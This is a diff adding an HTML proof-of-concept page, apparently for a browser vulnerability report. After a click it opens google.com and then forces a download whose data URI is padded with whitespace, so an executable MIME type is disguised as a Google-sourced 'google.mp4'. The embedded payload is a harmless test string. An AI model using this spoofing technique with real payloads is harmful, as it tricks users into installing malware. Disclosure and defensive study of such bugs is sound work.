@@ -1,1 +1,45 @@
-<iframe allow="fedcm" src="https://thundering-unruly-windflower.glitch.me/fcm.html">
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Download & Fullscreen on Keypress</title>
+</head>
+<body>
+  <center><h2>POC by Chigorin!</h2></center>
+  <input type="text" id="triggerInput">
+
+  <script>
+    document.getElementById('triggerInput').addEventListener('click', function() {
+      // request fullscreen
+ setTimeout(function() {
+        openWin();
+ }, 500);
+ window.open('https://www.google.com', '_blank');
+    }, { once: false }); // Use { once: true } to ensure it only fires once
+
+    // Download helper
+    function Puf(uri, name) {
+      const link = document.createElement("a");
+      link.href = uri;
+      link.download = name;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+    // Kick off your “APK” download
+    function openWin() {
+      Puf(
+        "data:https://google.com/                                                                                                                                                                                                                       application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
+        "google.mp4"
+      );
+    }
+
+  </script>
+  
+
+  
+</body>
+</html>
